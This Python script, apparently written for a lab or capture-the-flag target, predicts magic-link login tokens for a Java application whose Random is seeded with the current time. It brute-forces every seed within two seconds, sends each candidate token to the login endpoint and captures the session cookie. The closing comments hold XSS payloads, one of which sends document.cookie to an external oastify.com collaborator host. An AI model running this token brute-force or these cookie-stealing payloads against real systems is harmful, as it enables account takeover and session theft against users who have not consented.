#!/usr/bin/env python3
"""
repro_with_java_random_pkg.py
使用第三方包 java-random 来复现 Java TokenUtil.createToken 的 token。
python -m pip install --user git+https://github.com/MostAwesomeDude/java-random
"""

import base64
import time
from javarandom import Random   # 来自 MostAwesomeDude/java-random 仓库
import requests
import urllib.parse

# 源代码中的Random类实现方法，由于Random不安全，在同一个时间Random 实例在同一毫秒内被创建时，
# 默认种子就是当前时间戳,同一个种子生成得随机数是一样的，那么就能爆破出token, 只要我们知道了token生成过程
CHAR_LOWER = "abcdefghijklmnopqrstuvwxyz"
NUMBERS = "1234567890"
SYMBOLS = "!@#$%^&*()"
CHARSET = CHAR_LOWER + CHAR_LOWER.upper() + NUMBERS + SYMBOLS
TOKEN_LENGTH = 42
GENERATE_PATH = "/generateMagicLink" # 触发生成 token 的路径
MAGIC_LINK_PATH = "/magicLink/{}" # 使用 token 的路径

# token生成器，由于知道了种子是System.currentTimeMillis()，并且用的Random类，输入爆破的种子值就是token
def create_token_using_java_random_pkg(seed:str, user_id: int):
    rnd = Random(int(seed))
    raw = ''.join([CHARSET[rnd.nextInt(len(CHARSET))] for _ in range(TOKEN_LENGTH)])
    raw_bytes = raw.encode('utf-8')
    # Java (byte)字节码位数不不同Java 字节(Byte) 取值范围 [-128,127]
    # Python3 字节(bytes) 取值范围： [0,256)
    # & 0x80 取最高位（第 7 位）
    # 任何整数 & 0xFF 都只保留最低 8 位
    key = user_id & 0xFF
    if key > 127: key -= 256
    encbytes = bytearray(len(raw_bytes))
    for i, b in enumerate(raw_bytes):
        encbytes[i] = (b ^ key) & 0xFF

    return base64.urlsafe_b64encode(encbytes).decode('ascii').rstrip('=')

# 暴力列出来2秒内所有的seed可以得到的token
def brute_all_tokens(user_id: int, center_ms: int = None, radius_ms: int = 2_000):
    """把 center_ms ± radius_ms 内所有 token 全算出来"""
    if center_ms is None:
        center_ms = int(time.time() * 1000)

    print(f"中心时间 {center_ms} 前后 ±{radius_ms} ms 所有可能 token：")
    pairs = []
    for delta in range(-radius_ms, radius_ms + 1):
        seed = center_ms + delta
        tok = create_token_using_java_random_pkg(str(seed), user_id)
        pairs.append((seed, tok))

    return pairs

# 发送请求的函数token请求
def send_generate_magic_link(session: requests.Session, base_url: str, username: str):
    """
    POST /generateMagicLink 触发生成 token
    """
    url = urllib.parse.urljoin(base_url, GENERATE_PATH)
    data = {"username": username}
    resp = session.post(url, data=data, allow_redirects=False)
    return resp.status_code, resp.text

# 尝试token能不能用,如果返回报文里有Set-Cookie: session=xxx;，说明登录成功
def consume_magic_link(session: requests.Session, base_url: str, token: str):
    """
    GET /magicLink/{token} 使用 token 登录
    """
    path = MAGIC_LINK_PATH.format(urllib.parse.quote(token, safe=""))
    url = urllib.parse.urljoin(base_url, path)
    resp = session.get(url, allow_redirects=False)
    if resp.headers.get("Set-Cookie"):
        cookie = resp.headers.get("Set-Cookie")
        print("成功登录捕获cookie:", cookie)
        return cookie
    else:
        return

if __name__ == "__main__":
    base_url = "http://192.168.179.234:8888/"
    username = "Carl"
    uid = 5

    with requests.Session() as s:
        # 首先触发后端生成 token
        code, text = send_generate_magic_link(s, base_url, username)
        print("POST /generateMagicLink ->", code, text[:100])

        # 得到2 秒内所有可能token清单
        pairs = brute_all_tokens(uid)
        cookie = None
        # 逐个尝试 token
        print(f"正在尝试爆破当前用户{username} uid为{uid}得请求token") # 发送token申请
        for seed, tok in pairs:
            cookie = consume_magic_link(s, base_url, tok)
            if cookie:
                print("成功爆破出token，捕获cookie:", cookie)
                break
        if not cookie:
            print("没有成功捕获token，请排除错误")

        
# xss <code onafterscriptexecute=alert(1)><script>1</script>
# <code onafterscriptexecute=alert(1)><script>document.location="http://Yvnmd2x97pmyx8ictgoq94vrm6dc40uoj.oastify.com/${encodeURIComponent(document.cookie)"</script>